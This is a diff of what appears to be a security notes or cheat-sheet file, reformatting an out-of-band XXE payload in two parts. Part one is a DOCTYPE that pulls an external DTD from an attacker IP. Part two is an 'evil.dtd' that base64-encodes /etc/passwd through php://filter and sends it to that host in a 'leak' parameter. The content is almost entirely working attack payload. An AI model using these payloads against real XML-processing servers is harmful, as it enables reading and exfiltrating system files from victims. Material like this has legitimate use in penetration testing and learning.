@@ -650,19 +650,23 @@ https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploi
 
 -> Part 1
 
-<!DOCTYPE okay[
-<!ENTITY % ult SYSTEM "http://10.10.12.228/evil.dtd">
+\<!DOCTYPE okay[
+
+\<!ENTITY % ult SYSTEM "http://10.10.12.228/evil.dtd">
+
 %ult;
+
 ]
->
+
+\>
 
 -> Part 2
   
 codes/xxe_oob/evil.dtd
   
-<!ENTITY % file SYSTEM "php>://filter/convert.base64-encode/resource=/etc/passwd">
+\<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
   
-<!ENTITY % payload "<!ENTITY &#37; remote SYSTEM 'http://10.10.12.228/?leak=%file;'>">
+\<!ENTITY % payload "<!ENTITY &\#37; remote SYSTEM 'http://10.10.12.228/?leak=%file;'>">
   
 %payload;
   
